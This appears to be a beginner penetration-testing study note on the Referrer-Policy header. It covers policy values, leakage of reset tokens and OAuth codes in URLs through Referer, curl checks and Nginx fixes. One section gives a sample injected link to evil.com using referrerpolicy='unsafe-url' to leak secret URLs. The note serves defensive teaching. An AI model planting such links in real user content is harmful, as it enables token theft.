---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.38 Referrer-Policy — Leakage Control"
---

# 03.38 — Referrer-Policy

## What is it?

`Referrer-Policy` controls how much information the `Referer` header reveals when the user navigates from one page to another. Without a restrictive policy, sensitive tokens or paths in URLs are leaked to third parties via the `Referer` header.

---

## Policy Values

```
MOST TO LEAST RESTRICTIVE:

no-referrer:
  → Never sends Referer header at all
  → Most private

no-referrer-when-downgrade:
  → No Referer when going HTTPS → HTTP
  → Sends full URL for same-protocol requests

same-origin:
  → Only sends Referer for same-origin requests
  → No Referer for cross-origin

origin:
  → Sends only origin (https://target.com) for all requests
  → Never sends path/query string

strict-origin:
  → Sends only origin, but not for HTTPS→HTTP

origin-when-cross-origin:
  → Full URL for same-origin, only origin for cross-origin

strict-origin-when-cross-origin:  ← RECOMMENDED
  → Full URL same-origin, origin only cross-origin, nothing HTTPS→HTTP
  → Default in Chrome 85+ and Firefox 87+

unsafe-url:
  → Always sends full URL including path and query string
  → DANGEROUS!
```

---

## Attack: Sensitive Data Leaked via Missing Referrer-Policy

```
URL: https://target.com/reset?token=SECRET_PASSWORD_RESET_TOKEN

User on that page clicks external link or loads external image:
  GET https://third-party.com/analytics.js HTTP/1.1
  Referer: https://target.com/reset?token=SECRET_PASSWORD_RESET_TOKEN
  
  Third-party site receives the token in their logs!
  → Password reset token stolen without XSS or network access!

COMMON VULNERABLE SCENARIOS:
  - Password reset links: /reset?token=xxx
  - Unsubscribe links: /unsubscribe?token=xxx  
  - File download links: /download?key=xxx
  - OAuth codes: /callback?code=xxx
  - Session IDs in URL (legacy apps)
```

---

## Referrer-Policy Bypass via Meta Tag

```
Can also be set per-page via HTML meta tag:
  <meta name="referrer" content="no-referrer">
  
Or per-link:
  <a href="https://evil.com" referrerpolicy="unsafe-url">Click me</a>
  → This link will send full Referer to evil.com regardless of header policy!

ATTACK: Attacker-controlled link in user-generated content:
  <a href="https://evil.com" referrerpolicy="unsafe-url">Win a prize!</a>
  → If victim clicks while on page with secrets → leaked!
```

---

## Testing

```bash
# Check Referrer-Policy header
curl -sI https://target.com | grep -i "referrer-policy"
# Missing or "unsafe-url" → sensitive URLs may leak!

# Check if sensitive URLs have policy:
curl -sI https://target.com/reset?token=test | grep -i "referrer-policy"

# Test what Referer is sent (in browser DevTools):
# Navigate to target page → DevTools → Network → click link → check Referer on outbound
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| No Referrer-Policy | Set `Referrer-Policy: strict-origin-when-cross-origin` |
| Sensitive tokens in URL | Move secrets to POST body or cookie instead of URL |
| `unsafe-url` policy | Replace with strict-origin-when-cross-origin |

**Quick fix (Nginx):**
```nginx
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

---

## Related Notes
- [[15 - Referer]] — the request header this policy controls
- [[02.17 - HTTP Redirects]] — open redirects that cause Referer leakage
- [[Module 07 - CSRF]] — Referer-based CSRF protection bypass
